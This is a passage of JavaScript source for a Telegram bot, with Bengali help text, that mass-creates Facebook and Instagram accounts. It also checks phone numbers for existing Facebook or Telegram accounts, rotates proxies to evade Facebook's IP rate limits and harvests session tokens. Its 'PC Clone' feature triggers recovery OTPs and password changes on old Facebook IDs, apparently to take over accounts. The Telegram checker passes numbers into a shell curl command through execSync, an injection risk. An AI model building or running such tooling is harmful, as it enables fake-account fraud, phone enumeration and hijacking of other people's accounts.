        `🛡 <b>Route:</b> <code>${useProxyPool ? '🌐 PROXY POOL' : '⚡ DIRECT (0 Proxy Data)'}</code>  •  💾 <b>Proxy Used:</b> <code>${formatBytes(pxUsedDelta)}</code>`,
        `🟢 <b>Fresh / Available:</b> <code>${freeList.length}</code> numbers (No FB Account)`,
        `🔴 <b>Taken / Registered:</b> <code>${takenList.length}</code> numbers (Existing FB Account)`,
        `🟡 <b>Unknown / Rate Limited:</b> <code>${unknownList.length}</code>${rateLimitedCount > 0 ? ` (${rateLimitedCount} rate-limited)` : ''}`,
      ];

      if (freeList.length > 0) {
        const freePreview = freeList.slice(0, 15).map((n) => `+${n}`).join('\n');
        lines.push(
          '',
          `<b>🟢 Fresh Numbers (${freeList.length}):</b>`,
          `<blockquote><code>${escapeHtml(freePreview)}${freeList.length > 15 ? `\n... +${freeList.length - 15} more` : ''}</code></blockquote>`
        );
      }

      if (takenList.length > 0) {
        const takenPreview = takenList.slice(0, 10).map((t) => `+${t.num}${t.hint ? ` (${t.hint})` : ''}`).join('\n');
        lines.push(
          '',
          `<b>🔴 Taken Numbers (${takenList.length}):</b>`,
          `<blockquote><code>${escapeHtml(takenPreview)}${takenList.length > 10 ? `\n... +${takenList.length - 10} more` : ''}</code></blockquote>`
        );
      }

      if (rateLimitedCount > 5 && !useProxyPool && hasAnyProxy) {
        lines.push(`\n<blockquote>💡 <i>Facebook temporary IP limit detected on giant burst — tap <b>Switch to Proxy Mode</b> below if you want to rotate IPs.</i></blockquote>`);
      }

      const kb = {
        inline_keyboard: [
          ...(freeList.length > 0 ? [[btnOk(`▶️ Run Fresh Only (${freeList.length})`, 'norm:run_free')]] : []),
          [
            ...(freeList.length > 0 ? [btnOk('📥 Fresh .txt', 'gql:dl_free')] : []),
            ...(takenList.length > 0 ? [btnBad('📥 Taken .txt', 'gql:dl_taken')] : []),
          ],
          [
            btnNav(cfg.checker_use_proxy ? '🌐 Checker: PROXY POOL' : '⚡ Checker: DIRECT (0 PX)', 'checker:toggle_mode'),
            btnNav('🔢 Check More', 'menu:normalize'),
          ],
          [btnNav('⬅️ Main Menu', 'menu:home')],
        ],
      };
      if (progMsgId) await editMessage(chatId, progMsgId, lines.join('\n'), kb);
      else await sendMessage(chatId, lines.join('\n'), kb);
    })();
  }

  async function runTelegramBatchCheck(chatId, uid, nums) {
    if (!nums || nums.length === 0) {
      await sendMessage(chatId, '⚠️ No valid numbers provided for Telegram check.', {
        inline_keyboard: [[btnOk('✈️ TG Checker', 'menu:tg_check'), btnNav('⬅️ Main Menu', 'menu:home')]]
      });
      return;
    }

    const maxCount = Math.min(nums.length, 500);
    const progressRes = await sendMessage(
      chatId,
      [
        `✈️ <b>TELEGRAM BATCH CHECKER IN PROGRESS</b>`,
        DIVIDER,
        `📊 Total Numbers: <code>${maxCount}</code>`,
        `⏳ Checking status via Telegram network... (0 / ${maxCount})`,
      ].join('\n')
    );
    const progMsgId = progressRes.ok ? progressRes.result?.message_id : null;

    const registered = [];
    const unregistered = [];
    let checked = 0;

    for (const num of nums.slice(0, maxCount)) {
      checked++;
      try {
        const targetUrl = `https://t.me/+${num}`;
        const cmd = `curl -s -L --max-time 6 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "${targetUrl}"`;
        const res = child_process.execSync(cmd, { encoding: 'utf-8' });
        
        const hasProfile = res.includes('tgme_page_title') && !res.includes('If you have Telegram, you can contact') && !res.includes('tgme_channel_info');
        if (hasProfile || res.includes('tgme_page_user') || (res.includes('tgme_page_title') && res.includes('phone'))) {
          registered.push(num);
        } else {
          unregistered.push(num);
        }
      } catch {
        unregistered.push(num);
      }

      if ((checked % 10 === 0 || checked === maxCount) && progMsgId) {
        try {
          await editMessage(
            chatId,
            progMsgId,
            [
              `✈️ <b>TELEGRAM BATCH CHECKER IN PROGRESS</b>`,
              DIVIDER,
              `📊 Total Numbers: <code>${maxCount}</code>`,
              `✅ Registered: <code>${registered.length}</code>`,
              `❌ Unregistered: <code>${unregistered.length}</code>`,
              `⏳ Progress: ${checked} / ${maxCount} (${Math.round((checked / maxCount) * 100)}%)`,
            ].join('\n')
          );
        } catch {}
      }
    }

    tgRegisteredCache.set(uid, registered);
    tgUnregisteredCache.set(uid, unregistered);

    const summaryText = [
      `✈️ <b>TELEGRAM CHECKER COMPLETED</b>`,
      DIVIDER,
      `📊 <b>Processed:</b> <code>${maxCount}</code>`,
      `✅ <b>Registered (Has Telegram):</b> <code>${registered.length}</code>`,
      `❌ <b>Unregistered (No Telegram):</b> <code>${unregistered.length}</code>`,
      ``,
      `<i>Download results below as .txt files:</i>`,
    ].join('\n');

    const kb = {
      inline_keyboard: [
        [
          ...(registered.length > 0 ? [btnOk(`📥 Registered .txt (${registered.length})`, 'tg:dl_reg')] : []),
          ...(unregistered.length > 0 ? [btnBad(`📥 Unreg .txt (${unregistered.length})`, 'tg:dl_unreg')] : []),
        ],
        [
          btnNav('✈️ Check More Numbers', 'menu:tg_check'),
          btnNav('⬅️ Main Menu', 'menu:home'),
        ],
      ],
    };

    if (progMsgId) {
      await editMessage(chatId, progMsgId, summaryText, kb);
    } else {
      await sendMessage(chatId, summaryText, kb);
    }
  }

  async function runAndSendDiagnose(chatId, uid) {
    const cfg = readUserConfig(uid);
    const userCookies = readUserCookies(uid);
    const userProxies = readUserProxies(uid);
    const px = cfg.proxy || userProxies[0] || null;

    const statusRes = await sendMessage(chatId, `🩺 <i>Running live Limited FB, GraphQL & proxy diagnostics in parallel...</i>`);
    const statusMsgId = statusRes.ok ? statusRes.result?.message_id : null;
    const [d, curlCheck] = await Promise.all([
      runDiagnoseFor(cfg, userCookies, px),
      checkCurlAvailable(),
    ]);
    const rawTrace = d.trace.slice(-8).join('\n') || '-';
    const traceStr = rawTrace.length > 1800 ? rawTrace.slice(-1800) : rawTrace;
    const diagHtml = [
      `🩺 <b>CONNECTION, DEPS & ENGINE DIAGNOSTICS</b>`,
      DIVIDER,
      `⚙️ <b>Node.js:</b> <code>${escapeHtml(process.version)}</code> (${escapeHtml(process.platform)})`,
      `🧰 <b>Proxy Engine (curl):</b> ${curlCheck.ok ? '🟢 OK' : '🔴 MISSING'} (<code>${escapeHtml(curlCheck.version.slice(0, 40))}</code>)`,
      `🌐 <b>Proxy:</b> <code>${d.defaultProxy ? escapeHtml(d.defaultProxy) : 'Direct IP'}</code> ${d.proxyAlive === true ? `🟢 LIVE (${d.proxyLatency}ms)` : d.proxyAlive === false ? `🔴 DEAD (${escapeHtml(d.proxyError || '')})` : ''}`,
      ...(d.proxyExitIp ? [`🛰 <b>Proxy Exit IP:</b> <code>${escapeHtml(d.proxyExitIp)}</code>`] : []),
      `🔐 <b>Limited/Token Harvest:</b> ${d.tokenOk ? '🟢 TOKEN OK' : '🔴 NO TOKEN'}`,
      `🔍 <b>GraphQL Pre-Check:</b> ${d.gqlOk ? '🟢 OK' : '🔴 ERR'} (<code>${escapeHtml(d.gqlInfo || '-')}</code>)`,
      `📱 <b>Sample Device:</b> <code>${escapeHtml(d.deviceSample || '-')}</code>`,
      `🧬 <b>Pringer ID:</b> <code>${escapeHtml(d.pringerSample || '-')}</code>`,
      `📍 <b>Source:</b> <code>${escapeHtml(d.src || '-')}</code>`,
      `🧩 <b>Tokens:</b> lsd <code>${escapeHtml((d.lsd || '-').slice(0, 14))}</code> • e_tok <code>${escapeHtml((d.etok || '-').slice(0, 12))}</code> • cid <code>${escapeHtml(d.cid || '-')}</code>`,
      `📝 <b>Fields:</b> <code>${d.fields.length}</code>  •  <b>Actions:</b> <code>${d.actions.length}</code>  •  <b>Cookies:</b> <code>${d.cookiesCount}</code>`,
      ``,
      `<b>HTTP Trace:</b>`,
      `<blockquote><code>${escapeHtml(traceStr)}</code></blockquote>`,
    ].join('\n');
    const diagKb = {
      inline_keyboard: [
        [
          btnOk('🔄 Re-run Diagnose', 'menu:diagnose'),
          btnNav('⬅️ Main Menu', 'menu:home'),
        ],
      ],
    };
    if (statusMsgId) await editMessage(chatId, statusMsgId, diagHtml, diagKb);
    else await sendMessage(chatId, diagHtml, diagKb);
  }

  async function renderHelpMenu(chatId, isAdmin, st, editMsgId) {
    const brand = st.brandName || DEFAULT_BRAND_NAME;
    const txt = [
      `❓ <b>${escapeHtml(brand)} • ব্যবহারের সহজ গাইড ও কমান্ড</b>`,
      DIVIDER,
      `<b>বটের বাটনগুলোর সহজ পরিচিতি:</b>`,
      `├ ⚡ <b>FB Auto create:</b> অ্যাডমিন পুল/প্যানেল নাম্বার দিয়ে অটো FB তৈরি`,
      `├ 🛠 <b>FB Tools:</b> LOL সিস্টেমে নাম্বার/রেঞ্জ বেছে FB তৈরি ও লাইভ OTP দেখা`,
      `├ 📷 <b>IG Auto create:</b> ইনস্টাগ্রাম অ্যাকাউন্ট তৈরি ও OTP ভেরিফিকেশন`,
      `├ 🔍 <b>Number Check:</b> নাম্বারে FB বা TG আছে কিনা যাচাই`,
      `├ 💻 <b>PC Clone:</b> পুরনো FB আইডি রিকভারি OTP ও পাসওয়ার্ড পরিবর্তন`,
      `└ 🔐 <b>OTP / কুকি / একাউন্টস / সেটিংস:</b> কোড দেয়া, ফ্রেশ কুকি ও সেভ করা আইডি দেখা`,
      ``,
      `<b>দরকারি কমান্ড:</b>`,
      `├ /start — মেইন ড্যাশবোর্ড খুলুন`,
      `├ /fbcreate — FB Auto create খুলুন`,
      `├ /fbtools — FB Tools (LOL ইঞ্জিন) খুলুন`,
      `├ /pcclone — PC Clone খুলুন`,
      `├ /check &lt;নাম্বার&gt; — নাম্বার Free/Taken যাচাই করুন`,
      `├ /otp — পেন্ডিং OTP লিস্ট দেখুন`,
      `├ /accounts — তৈরি হওয়া আইডি দেখুন`,
      `├ /settings — পাসওয়ার্ড, প্রক্সি ও থ্রেড সেট করুন`,
      `├ /fresh — ১ ক্লিকে পুরনো কুকি-ক্যাশ মুছে ফ্রেশ করুন`,
      `└ /cancel — চলমান টেক্সট ইনপুট বাতিল করুন`,
      ...(isAdmin
        ? [
            ``,
            `<b>অ্যাডমিন কমান্ড:</b>`,
            `├ /admin — অ্যাডমিন কন্ট্রোল প্যানেল`,
            `└ /broadcast &lt;বার্তা&gt; — সব ইউজারকে মেসেজ পাঠান`,
          ]
        : []),
      ``,
      `<blockquote>💬 সাহায্য বা আপডেটের জন্য: ${escapeHtml(st.adminUsername)} • ${escapeHtml(getChannelHandle(st.channelUrl))}</blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnUrl(`📢 চ্যানেলে জয়েন (${getChannelHandle(st.channelUrl)})`, st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
          btnUrl('👑 ওনারকে মেসেজ দিন', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
        ],
        [
          btnOk('🏠 মেইন ড্যাশবোর্ড', 'menu:home'),
          btnNav('⚙️ সেটিংস ও পাসওয়ার্ড', 'menu:settings'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderSupportMenu(chatId, editMsgId) {
    const st = readSettings();
    const txt = [
      `💬 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • সাপোর্ট ও অফিসিয়াল চ্যানেল</b>`,
      DIVIDER,
      `যেকোনো সমস্যা, নতুন আপডেট বা সাহায্যের জন্য সরাসরি যোগাযোগ করুন:`,
      ``,
      `👑 <b>বট ওনার / অ্যাডমিন:</b> ${escapeHtml(st.adminUsername || DEFAULT_ADMIN_USERNAME)}`,
      `📢 <b>অফিসিয়াল চ্যানেল:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
      ``,
      `নিচের বাটনে চাপ দিয়ে সরাসরি ওনারের সাথে কথা বলুন অথবা চ্যানেলে যুক্ত হোন:`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnUrl('👑 ওনারের সাথে কথা বলুন', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
          btnUrl('📢 অফিসিয়াল চ্যানেল', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
        ],
        [
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function processMessage(msg) {
    if (!msg.from) return;
    const chatId = msg.chat.id;
    const st = readSettings();
    const user = getOrCreateUser(msg.from);
    const uid = user.id;
    const isAdmin = isUserAdmin(user, st);
    const text = (msg.text || msg.caption || '').trim();

    if (text.startsWith('/start') || text.startsWith('/menu')) {
      promptSessions.delete(uid);
      await renderHome(chatId, msg.from);
      return;
    }

    if (text.startsWith('/help')) {
      await renderHelpMenu(chatId, isAdmin, st);
      return;
    }

    if (text.startsWith('/support')) {
      promptSessions.delete(uid);
      await renderSupportMenu(chatId);
      return;
    }

    if (text.startsWith('/cancel')) {
      promptSessions.delete(uid);
      await sendMessage(chatId, '✅ <b>Prompt Cancelled</b>\nReturned to idle state.', {
        inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
      });
      return;
    }

    if (st.maintenanceMode && !isAdmin) {
      await renderHome(chatId, msg.from);
      return;
    }

    if (user.status === 'blocked' || (user.status !== 'approved' && !isAdmin)) {
      await renderHome(chatId, msg.from);
      return;
    }

    if (!isAdmin && st.requireChannelJoin) {
      const ch = await checkChannelMembership(uid, st);
      if (!ch.ok) {
        await renderHome(chatId, msg.from);
        return;
      }
    }

    if (text.startsWith('/run') || text.startsWith('/create')) {
      promptSessions.delete(uid);
      const rest = text.replace(/^\/(run|create)\s*/, '').trim();
      if (rest) await startUserBatchRun(chatId, user, rest);
      else await renderRunPrompt(chatId, uid);
      return;
    }

    if (text === '/check' || text.startsWith('/check ')) {
      promptSessions.delete(uid);
      const rest = text.slice('/check'.length).trim();
      const cfg = readUserConfig(uid);
      if (rest) {
        const nums = Array.from(
          new Set(
            rest
              .split(/[\r\n,\s]+/)
              .map((t) => normNumber(t.trim(), cfg.cc))
              .filter(Boolean)
          )
        );
        await runGraphqlBatchCheck(chatId, uid, nums);
      } else {
        promptSessions.set(uid, { kind: 'awaiting_gqlcheck' });
        await sendMessage(
          chatId,
          `🔍 <b>GRAPHQL FREE/TAKEN CHECKER (UP TO 1,000)</b>\n${DIVIDER}\n⚡ <b>Route:</b> <code>${cfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</code>\nPaste phone numbers (up to <b>1,000</b>) or upload a <code>.txt</code> file to split <b>Fresh</b> vs <b>Taken</b> (CC: <code>+${escapeHtml(cfg.cc)}</code>):`,
          {
            inline_keyboard: [
              [btnNav(cfg.checker_use_proxy ? '🌐 Mode: PROXY POOL' : '⚡ Mode: DIRECT (0 PX)', 'checker:toggle_mode')],
              [btnBad('❌ Cancel', 'prompt:cancel')],
            ],
          }
        );
      }
      return;
    }

    if (text.startsWith('/otp')) {
      promptSessions.delete(uid);
      await renderOtpQueue(chatId, uid);
      return;
    }

    if (text.startsWith('/accounts')) {
      promptSessions.delete(uid);
      await renderAccountsMenu(chatId, uid, 'ready');
      return;
    }

    if (text.startsWith('/proxies')) {
      promptSessions.delete(uid);
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/fbcreate') || text.startsWith('/voltx')) {
      promptSessions.delete(uid);
      await renderFbAutoCreateMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/fbtools')) {
      promptSessions.delete(uid);
      await renderFbToolsMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/pcclone')) {
      promptSessions.delete(uid);
      await renderPcCloneMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/numbercheck')) {
      promptSessions.delete(uid);
      await renderNumberCheckMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/fresh')) {
      promptSessions.delete(uid);
      wipeUserCookiesAndCache(uid);
      await sendMessage(
        chatId,
        `🧼 <b>1-CLICK FRESH COOKIES &amp; CACHE CLEARED!</b>\n${DIVIDER}\n✅ Regenerated fresh <code>sb + datr</code> Facebook cookies\n✅ Cleared Done history, Logs &amp; number caches\n<i>Your IDs &amp; sessions will stay 100% fresh on the next run!</i>`,
        { inline_keyboard: [[btnOk('🚀 Dashboard', 'menu:home'), btnNav('💻 PC Clone', 'menu:pc_clone')]] }
      );
      return;
    }

    if (text.startsWith('/settings')) {
      promptSessions.delete(uid);
      await renderSettings(chatId, uid);
      return;
    }

    if (text.startsWith('/cookies')) {
      promptSessions.delete(uid);
      await renderCookiesMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/logs')) {
      promptSessions.delete(uid);
      await renderLogsMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/diag') || text.startsWith('/deps')) {
      promptSessions.delete(uid);
      await runAndSendDiagnose(chatId, uid);
      return;
    }

    if (text.startsWith('/admin')) {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ Admin access only.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      promptSessions.delete(uid);
      await renderAdminHome(chatId);
      return;
    }

    if (text === '/broadcast' || text.startsWith('/broadcast ')) {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ Admin access only.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      const body = text.slice('/broadcast'.length).trim();
      if (!body) {
        await sendMessage(chatId, 'Usage: <code>/broadcast Hello everyone!</code>', {
          inline_keyboard: [[btnOk('📣 Interactive Broadcast', 'admin:broadcast'), btnNav('👑 Admin Panel', 'admin:home')]],
        });
        return;
      }
      const sent = await broadcastMessage(body);
      await sendMessage(chatId, `📣 Broadcast delivered to <code>${sent}</code> approved users.`, {
        inline_keyboard: [[btnNav('👑 Admin Panel', 'admin:home')]],
      });
      return;
    }

    if (msg.document) {
      const session = promptSessions.get(uid);
      const isPoolUpload = Boolean(isAdmin && session?.kind === 'admin_awaiting_country_numbers');
      const maxSize = isPoolUpload ? MAX_NUMBER_UPLOAD_BYTES : 2 * 1024 * 1024;
      if ((msg.document.file_size || 0) > maxSize) {
        await sendMessage(
          chatId,
          `❌ File too large (max ${isPoolUpload ? '10 MB' : '2 MB'}).`,
          { inline_keyboard: [[btnNav(isPoolUpload ? '⬅️ Countries Menu' : '⬅️ Main Menu', isPoolUpload ? 'admin:countries' : 'menu:home')]] }
        );
        return;
      }
      const fileMeta = await tgCall('getFile', { file_id: msg.document.file_id });
      const filePath = fileMeta.result?.file_path;
      if (!fileMeta.ok || !filePath || filePath.includes('..')) {
        await sendMessage(chatId, '❌ Could not download uploaded file.', {
          inline_keyboard: [[btnNav(isPoolUpload ? '⬅️ Countries Menu' : '⬅️ Main Menu', isPoolUpload ? 'admin:countries' : 'menu:home')]],
        });
        return;
      }
      try {
        const docBuf = await tgDownloadFileBuffer(filePath);
        if (isPoolUpload) {
          const fname = String(msg.document.file_name || filePath || '').toLowerCase();
          if (!fname.endsWith('.txt') && !fname.endsWith('.csv') && !fname.endsWith('.xlsx')) {
            await sendMessage(
              chatId,
              `❌ Invalid file format. Please upload a <code>.txt</code>, <code>.csv</code>, or <code>.xlsx</code> file (or paste numbers directly):`,
              { inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]] }
            );
            return;
          }
          let rawCells = [];
          if (fname.endsWith('.xlsx')) {
            rawCells = parseXlsxBuffer(docBuf);
          } else if (fname.endsWith('.csv')) {
            rawCells = parseCsvBuffer(docBuf);
          } else {
            rawCells = parseTxtBuffer(docBuf);
          }
          const uniqueParsed = normalizeUniquePoolNumbers(rawCells);
          if (uniqueParsed.length === 0) {
            await sendMessage(
              chatId,
              `❌ <b>No valid phone numbers found</b> in <code>${escapeHtml(msg.document.file_name || 'file')}</code>.`,
              { inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]] }
            );
            return;
          }
          if (uniqueParsed.length > MAX_NUMBERS_PER_UPLOAD) {
            await sendMessage(
              chatId,
              `❌ Too many unique numbers (<code>${uniqueParsed.length}</code>). Max allowed per upload is <code>${MAX_NUMBERS_PER_UPLOAD}</code>.`,
              { inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]] }
            );
            return;
          }
          promptSessions.delete(uid);
          const addRes = addNumbersToAdminCountry(session.countryId, uniqueParsed);
          if (!addRes.ok) {
            await sendMessage(chatId, '❌ Selected country no longer exists.', {
              inline_keyboard: [[btnNav('⬅️ Countries Menu', 'admin:countries')]],
            });
            return;
          }
          pushBotLog(`Admin uploaded ${addRes.added} numbers to ${addRes.country.name} (${addRes.skippedDupes} dupes skipped)`);
          await sendMessage(
            chatId,
            [
              `✅ <b>NUMBERS UPLOADED TO ${escapeHtml(addRes.country.name)}</b>`,
              DIVIDER,
              `📄 <b>File:</b> <code>${escapeHtml(msg.document.file_name || 'upload')}</code>`,
              `➕ <b>Added:</b> <code>${addRes.added}</code>`,
              `♻️ <b>Duplicates Skipped:</b> <code>${addRes.skippedDupes}</code>`,
            ].join('\n'),
            {
              inline_keyboard: [
                [
                  btnOk('📤 Upload More', `admin:country_upload:${addRes.country.id}`),
                  btnNav('🌍 Countries Menu', 'admin:countries'),
                ],
              ],
            }
          );
          return;
        }

        const rawDoc = docBuf.toString('utf-8');
        promptSessions.delete(uid);
        if (session?.kind === 'awaiting_normalize') {
          await handleNormalizeText(chatId, uid, rawDoc);
        } else if (session?.kind === 'awaiting_pc_clone') {
          const cfg = readUserConfig(uid);
          const nums = Array.from(
            new Set(
              rawDoc
                .split(/[\r\n,\s]+/)
                .map((t) => parsePcCloneTarget(t.trim(), cfg.cc))
                .filter(Boolean)
            )
          );
          await runPcCloneBatch(chatId, uid, nums);
        } else if (session?.kind === 'awaiting_pc_links') {
          const parsedLinks = normalizePcRecoveryUrls(rawDoc, { fallbackToDefaults: false });
          if (parsedLinks.length === 0) {
            await sendMessage(
              chatId,
              `❌ <b>No Valid Facebook Links Found</b>\nAllowed hosts: <code>www.facebook.com</code>, <code>m.facebook.com</code>, <code>mbasic.facebook.com</code>`,
              { inline_keyboard: [[btnNav('🔗 Back to Links', 'pc:links')]] }
            );
            return;
          }
          writeUserConfig(uid, { pc_recovery_urls: parsedLinks });
          await sendMessage(chatId, `✅ Saved <code>${parsedLinks.length}</code> Facebook recovery link(s).`);
          await renderPcCloneLinksMenu(chatId, uid);
        } else if (session?.kind === 'awaiting_gqlcheck') {
          const cfg = readUserConfig(uid);
          const nums = Array.from(
            new Set(
              rawDoc
                .split(/[\r\n,\s]+/)
                .map((t) => normNumber(t.trim(), cfg.cc))
                .filter(Boolean)
            )
          );
          await runGraphqlBatchCheck(chatId, uid, nums);
        } else if (session?.kind === 'awaiting_tgcheck') {
          const cfg = readUserConfig(uid);
          const nums = Array.from(
            new Set(
              rawDoc
                .split(/[\r\n,\s]+/)
                .map((t) => normNumber(t.trim(), cfg.cc))
                .filter(Boolean)
            )
          );
          await runTelegramBatchCheck(chatId, uid, nums);
        } else if (session?.kind === 'awaiting_proxies') {
          const additions = parseProxyLines(rawDoc);
          if (additions.length === 0) {
            await sendMessage(
              chatId,
              `❌ <b>No Valid Proxies Found in File</b>\n<blockquote>Supported formats:\n• <code>user:pass:host:port</code> (9Proxy)\n• <code>host:port:user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code></blockquote>`,
              { inline_keyboard: [[btnOk('➕ Try Again', 'proxies:add'), btnNav('⬅️ Main Menu', 'menu:home')]] }
            );
            return;
          }
          const merged = [...readUserProxies(uid), ...additions];
          writeUserProxies(uid, merged);
          await sendMessage(
            chatId,
            `✅ Parsed & saved <code>${additions.length}</code> proxies (Pool total: <code>${readUserProxies(uid).length}</code>).`,
            {
              inline_keyboard: [
                [
                  btnOk('🧪 Test All Proxies', 'proxies:test'),
                  btnNav('🌐 Manage Proxies', 'menu:proxies'),
                ],
                [btnNav('⬅️ Main Menu', 'menu:home')],
              ],
            }
          );
        } else if (session?.kind === 'awaiting_fbtools_custom_nums') {
          const cfg = readUserConfig(uid);
          const nums = Array.from(
            new Set(
              rawDoc
                .split(/[\r\n,\s]+/)
                .map((t) => normNumber(t.trim(), cfg.cc))
                .filter(Boolean)
            )
          );
          await startFbToolsBatch(chatId, user, { source: 'custom', customNumbers: nums });
        } else {
          await startUserBatchRun(chatId, user, rawDoc);
        }
      } catch (err) {
        await sendMessage(
          chatId,
          `❌ Failed to parse document: <code>${escapeHtml(err instanceof Error ? err.message : 'Unknown error')}</code>`,
          { inline_keyboard: [[btnNav(isPoolUpload ? '⬅️ Countries Menu' : '⬅️ Main Menu', isPoolUpload ? 'admin:countries' : 'menu:home')]] }
        );
      }
      return;
    }

    const session = promptSessions.get(uid);
    if (!session) {
      await renderHome(chatId, msg.from);
      return;
    }

    if (session.kind === 'awaiting_numbers') {
      promptSessions.delete(uid);
      await startUserBatchRun(chatId, user, text);
      return;
    }

    if (session.kind === 'awaiting_normalize') {
      promptSessions.delete(uid);
      await handleNormalizeText(chatId, uid, text);
      return;
    }

    if (session.kind === 'awaiting_tgcheck') {
      promptSessions.delete(uid);
      const cfg = readUserConfig(uid);
      const nums = Array.from(
        new Set(
          text
            .split(/[\r\n,\s]+/)
            .map((t) => normNumber(t.trim(), cfg.cc))
            .filter(Boolean)
        )
      );
      await runTelegramBatchCheck(chatId, uid, nums);
      return;
    }

    if (session.kind === 'awaiting_pc_clone') {
      promptSessions.delete(uid);
      const cfg = readUserConfig(uid);
      const nums = Array.from(
        new Set(
          text
            .split(/[\r\n,\s]+/)
            .map((t) => parsePcCloneTarget(t.trim(), cfg.cc))
            .filter(Boolean)
        )
      );
      await runPcCloneBatch(chatId, uid, nums);
      return;
    }

    if (session.kind === 'awaiting_lamix_token') {
      promptSessions.delete(uid);
      await sendMessage(chatId, '⛔ শুধুমাত্র অ্যাডমিন API Key সেট করতে পারবেন।', {
        inline_keyboard: [[btnNav('⬅️ PC Clone', 'menu:pc_clone')]],
      });
      return;
    }

    if (session.kind === 'awaiting_pc_resends') {
      const n = Number(text);
      if (!Number.isFinite(n) || n < 1 || n > 12) {
        await sendMessage(chatId, '❌ Enter Forgot OTP repeat count between <code>1</code> and <code>12</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:pc_clone')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_otp_resends: Math.round(n) });
      await sendMessage(chatId, `✅ PC Clone Forgot OTP repeats set to <code>${Math.round(n)}x</code>.`);
      await renderPcCloneMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_pc_links') {
      const parsedLinks = normalizePcRecoveryUrls(text, { fallbackToDefaults: false });
      if (parsedLinks.length === 0) {
        await sendMessage(
          chatId,
          `❌ <b>Invalid Facebook Link(s)</b>\nSend one or multiple valid <code>https://*.facebook.com/...</code> URLs (one per line), e.g.:\n<code>https://www.facebook.com/login/</code>\n<code>https://m.facebook.com/login/</code>\n<code>https://www.facebook.com/login/identify/</code>\n<code>https://www.facebook.com/hacked/</code>`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'pc:links')]] }
        );
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_recovery_urls: parsedLinks });
      await sendMessage(chatId, `✅ Saved <code>${parsedLinks.length}</code> Facebook recovery link(s) for PC Clone.`);
      await renderPcCloneLinksMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_gqlcheck') {
      promptSessions.delete(uid);
      const cfg = readUserConfig(uid);
      const nums = Array.from(
        new Set(
          text
            .split(/[\r\n,\s]+/)
            .map((t) => normNumber(t.trim(), cfg.cc))
            .filter(Boolean)
        )
      );
      await runGraphqlBatchCheck(chatId, uid, nums);
      return;
    }

    if (session.kind === 'awaiting_otp') {
      await handleOtpReply(chatId, uid, session.phone, text);
      return;
    }

    if (session.kind === 'awaiting_manual_otp') {
      promptSessions.delete(uid);
      const parts = text.split('|').map((s) => s.trim());
      const cfg = readUserConfig(uid);
      const clean = normNumber(parts[0] || '', cfg.cc) || (parts[0] || '').replace(/\D/g, '');
      if (!clean) {
        await sendMessage(
          chatId,
          '❌ Invalid phone number. Format: <code>phone|name|confirm_url</code>',
          { inline_keyboard: [[btnOk('➕ Try Again', 'otp:manual'), btnBad('❌ Cancel', 'menu:otp')]] }
        );
        return;
      }
      pushUserPending(uid, {
        status: 'CONFIRM',
        phone: clean,
        name: parts[1] || 'Manual Session',
        pass: cfg.password,
        uid: '',
        cookies: {},
        confirm_url: parts[2] || 'https://m.facebook.com/confirmphone.php',
        proxy: cfg.proxy || '',
        fmt: clean,
        confirmed: false,
      });
      await renderOtpQueue(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_proxies') {
      promptSessions.delete(uid);
      const additions = parseProxyLines(text);
      if (additions.length === 0) {
        await sendMessage(
          chatId,
          `❌ <b>No Valid Proxy Format Recognized</b>\n<blockquote>Supported formats:\n• <code>user:pass:host:port</code> (9Proxy)\n• <code>host:port:user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code>\n• <code>ip:port</code></blockquote>`,
          { inline_keyboard: [[btnOk('➕ Try Again', 'proxies:add'), btnBad('❌ Cancel', 'menu:proxies')]] }
        );
        return;
      }
      const merged = [...readUserProxies(uid), ...additions];
      writeUserProxies(uid, merged);
      await sendMessage(
        chatId,
        `✅ Parsed <code>${additions.length}</code> valid proxies and saved to pool (Total: <code>${readUserProxies(uid).length}</code>).`,
        {
          inline_keyboard: [
            [
              btnOk('🧪 Test All Proxies', 'proxies:test'),
              btnNav('🌐 Manage Proxies', 'menu:proxies'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        }
      );
      return;
    }

